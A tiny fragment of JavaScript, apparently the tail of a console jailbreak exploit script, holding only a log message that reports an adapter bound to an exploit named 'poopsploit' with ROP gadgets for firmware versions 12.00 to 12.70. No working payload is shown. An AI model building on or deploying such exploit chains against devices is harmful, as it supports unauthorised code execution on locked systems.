    P.log("[p2jb_poops] Y2JB adapter bound on poopsploit (gadgets 12.00-12.70, async syscall).");
})(typeof window !== "undefined" ? window : globalThis);
